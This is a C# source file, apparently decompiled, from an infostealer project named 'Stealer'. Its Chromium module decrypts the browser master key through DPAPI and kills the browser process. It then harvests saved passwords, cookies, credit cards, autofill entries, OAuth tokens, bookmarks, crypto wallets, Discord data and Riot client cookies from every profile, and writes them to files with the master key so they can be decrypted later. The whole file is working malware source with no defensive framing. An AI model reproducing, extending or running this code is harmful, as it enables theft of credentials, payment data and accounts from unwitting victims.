using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Leb128;
using Stealer.Steal.Decrypt;
using Stealer.Steal.Helper;
using Stealer.Steal.Sql;
using Stealer.Steal.Target.Crypto.Browsers;
using Stealer.Steal.Target.Messangers;

namespace Stealer.Steal.Target.Browsers;

internal class Chromium
{
	public byte[] MasterKey;

	public string[] ProfilesList;

	public string pathUserData;

	public string BrowserDir;

	public string appPath;

	public string name;

	public Browser browser;

	public Chromium(string pathUserData)
	{
		this.pathUserData = pathUserData;
		GetMasterKey();
		Profiles();
		GetBrowserName();
		BrowserDir = Path.Combine("Browsers", name);
		browser = new Browser();
		browser.Name = name;
	}

	public void GetMasterKey()
	{
		try
		{
			if (!File.Exists(Path.Combine(pathUserData, "Local State")))
			{
				return;
			}
			foreach (Match item in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(Path.Combine(pathUserData, "Local State"))))
			{
				if (item.Success)
				{
					MasterKey = Convert.FromBase64String(item.Groups[1].Value);
				}
			}
			byte[] array = new byte[MasterKey.Length - 5];
			Array.Copy(MasterKey, 5, array, 0, MasterKey.Length - 5);
			try
			{
				MasterKey = DpApi.Decrypt(array);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void Profiles()
	{
		List<string> list = new List<string>();
		string[] directories = Directory.GetDirectories(pathUserData);
		foreach (string text in directories)
		{
			if (File.Exists(Path.Combine(text, "Login Data")) || File.Exists(Path.Combine(text, "Web Data")) || File.Exists(Path.Combine(text, "Network", "Cookies")) || File.Exists(Path.Combine(text, "History")) || File.Exists(Path.Combine(text, "Bookmarks")))
			{
				list.Add(text);
			}
		}
		ProfilesList = list.ToArray();
	}

	public void GetBrowserName()
	{
		string[] array = pathUserData.Split(new char[1] { Path.DirectorySeparatorChar });
		name = array[5];
	}

	public void Start()
	{
		try
		{
			appPath = ProcessKiller.Kill(name);
			if (pathUserData.EndsWith("riot-client-ux"))
			{
				StealCookiesRiot();
				if (MasterKey != null && DynamicFiles.DirectoryExists(Path.Combine("Gaming", "Riot")))
				{
					DynamicFiles.WriteAllBytes(Path.Combine("Gaming", "Riot", "MasterKey.bin"), MasterKey);
				}
				return;
			}
			List<Thread> list = new List<Thread>();
			string[] profilesList = ProfilesList;
			foreach (string profile in profilesList)
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					StealPassword(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					StealCookies(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					StealCreditCards(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					StealAutoFill(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					StealBookmark(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					StealToken(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					browser.Wallets += CryptoChromium.GetChromeWallets(profile, name);
				}));
				string localstorage = Path.Combine(profile, "Local Storage", "leveldb");
				if (Directory.Exists(localstorage))
				{
					list.Add(new Thread((ThreadStart)delegate
					{
						Discord.Start(localstorage);
					}));
				}
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			if (MasterKey != null && DynamicFiles.DirectoryExists(BrowserDir))
			{
				DynamicFiles.WriteAllBytes(Path.Combine(BrowserDir, "MasterKey.bin"), MasterKey);
			}
			Counter.Browsers.Add(browser);
			if (string.IsNullOrEmpty(appPath))
			{
				return;
			}
			try
			{
				Process.Start(appPath);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public string Utf8(string str)
	{
		return Encoding.UTF8.GetString(Encoding.Default.GetBytes(str));
	}

	public void StealPassword(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Login Data")))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(Path.Combine(profile, "Login Data"), "logins");
			if (sqLite == null)
			{
				return;
			}
			List<object> list = new List<object>();
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					string value = sqLite.GetValue(i, 0);
					string value2 = sqLite.GetValue(i, 3);
					byte[] bytes = Encoding.Default.GetBytes(sqLite.GetValue(i, 5));
					if (bytes != null && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2))
					{
						list.Add(new object[3]
						{
							Utf8(value),
							Utf8(value2),
							bytes
						});
						browser.Passwords++;
					}
				}
				catch
				{
				}
			}
			DynamicFiles.WriteAllBytes(Path.Combine(path, "EncryptPassword.bin"), LEB128.Write(list.ToArray()));
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	public void StealCookiesRiot()
	{
		if (!File.Exists(Path.Combine(BrowserDir, "Network", "Cookies")))
		{
			return;
		}
		SqLite sqLite = SqlReader.ReadTable(Path.Combine(BrowserDir, "Network", "Cookies"), "cookies");
		if (sqLite == null)
		{
			return;
		}
		List<object> list = new List<object>();
		for (int i = 0; i < sqLite.GetRowCount(); i++)
		{
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sqLite.GetValue(i, 5));
				string value = sqLite.GetValue(i, 1);
				string value2 = sqLite.GetValue(i, 3);
				string value3 = sqLite.GetValue(i, 6);
				string value4 = sqLite.GetValue(i, 7);
				if (bytes != null)
				{
					list.Add(new object[5]
					{
						Utf8(value),
						Utf8(value3),
						Utf8(value4),
						Utf8(value2),
						bytes
					});
					browser.Cookies++;
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
		DynamicFiles.WriteAllBytes(Path.Combine("Gaming", "Riot", "EncryptCookie.bin"), LEB128.Write(list.ToArray()));
	}

	public void StealCookies(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Network", "Cookies")))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(Path.Combine(profile, "Network", "Cookies"), "cookies");
			if (sqLite == null)
			{
				return;
			}
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			List<object> list = new List<object>();
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					byte[] bytes = Encoding.Default.GetBytes(sqLite.GetValue(i, 5));
					string value = sqLite.GetValue(i, 1);
					string value2 = sqLite.GetValue(i, 3);
					string value3 = sqLite.GetValue(i, 6);
					string value4 = sqLite.GetValue(i, 7);
					if (bytes != null)
					{
						list.Add(new object[5]
						{
							Utf8(value),
							Utf8(value3),
							Utf8(value4),
							Utf8(value2),
							bytes
						});
						browser.Cookies++;
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
			DynamicFiles.WriteAllBytes(Path.Combine(path, "EncryptCookie.bin"), LEB128.Write(list.ToArray()));
		}
		catch
		{
		}
	}

	public void StealCreditCards(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Web Data")))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(Path.Combine(profile, "Web Data"), "credit_cards");
			if (sqLite == null)
			{
				return;
			}
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			List<object> list = new List<object>();
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					byte[] bytes = Encoding.Default.GetBytes(sqLite.GetValue(i, 4));
					string value = sqLite.GetValue(i, 3);
					string value2 = sqLite.GetValue(i, 2);
					sqLite.GetValue(i, 1);
					if (bytes != null)
					{
						list.Add(new object[4]
						{
							bytes,
							Utf8(value2),
							Utf8(value),
							Utf8(name)
						});
					}
				}
				catch
				{
				}
			}
			DynamicFiles.WriteAllBytes(Path.Combine(path, "EncryptCreditCard.bin"), LEB128.Write(list.ToArray()));
		}
		catch
		{
		}
	}

	public void StealAutoFill(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Web Data")))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(Path.Combine(profile, "Web Data"), "autofill");
			if (sqLite == null)
			{
				return;
			}
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			List<string> list = new List<string>();
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					string value = sqLite.GetValue(i, 0);
					string value2 = sqLite.GetValue(i, 1);
					if (!string.IsNullOrEmpty(value2))
					{
						browser.AutoFill++;
						list.Add("Name: " + Utf8(value) + "\nValue: " + Utf8(value2));
					}
				}
				catch
				{
				}
			}
			DynamicFiles.WriteAllText(Path.Combine(path, "AutoFill.txt"), string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
		}
		catch
		{
		}
	}

	public void StealToken(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Web Data")))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(Path.Combine(profile, "Web Data"), "token_service");
			if (sqLite == null)
			{
				return;
			}
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			List<object> list = new List<object>();
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					string value = sqLite.GetValue(i, 0);
					byte[] bytes = Encoding.Default.GetBytes(sqLite.GetValue(i, 1));
					if (bytes != null)
					{
						list.Add(new object[2]
						{
							Utf8(value),
							bytes
						});
					}
				}
				catch
				{
				}
			}
			DynamicFiles.WriteAllBytes(Path.Combine(path, "EncryptTokenRestore.bin"), LEB128.Write(list.ToArray()));
		}
		catch
		{
		}
	}

	public void StealBookmark(string profile)
	{
		try
		{
			if (!File.Exists(Path.Combine(profile, "Bookmarks")))
			{
				return;
			}
			string path = Path.Combine(BrowserDir, Path.GetFileName(profile));
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(Path.Combine(profile, "Bookmarks"), Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},");
			List<string> list = new List<string>();
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (!text.Contains("\"name\": \"") || !text.Contains("\"type\": \"url\",") || !text.Contains("\"url\": \"http"))
				{
					continue;
				}
				int num = 0;
				string[] array3 = Regex.Split(text, Parser.Separator);
				foreach (string data in array3)
				{
					try
					{
						num++;
						if (Parser.DetectTitle(data))
						{
							string text2 = Parser.Get(text, num);
							string text3 = Parser.Get(text, num + 2);
							if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && !text3.Contains("Failed to parse url"))
							{
								browser.Bookmarks++;
								list.Add("Title: " + Utf8(text2) + "\nUrl: " + Utf8(text3));
							}
						}
					}
					catch
					{
					}
				}
			}
			DynamicFiles.WriteAllText(Path.Combine(path, "Bookmark.txt"), string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
		}
		catch
		{
		}
	}
}
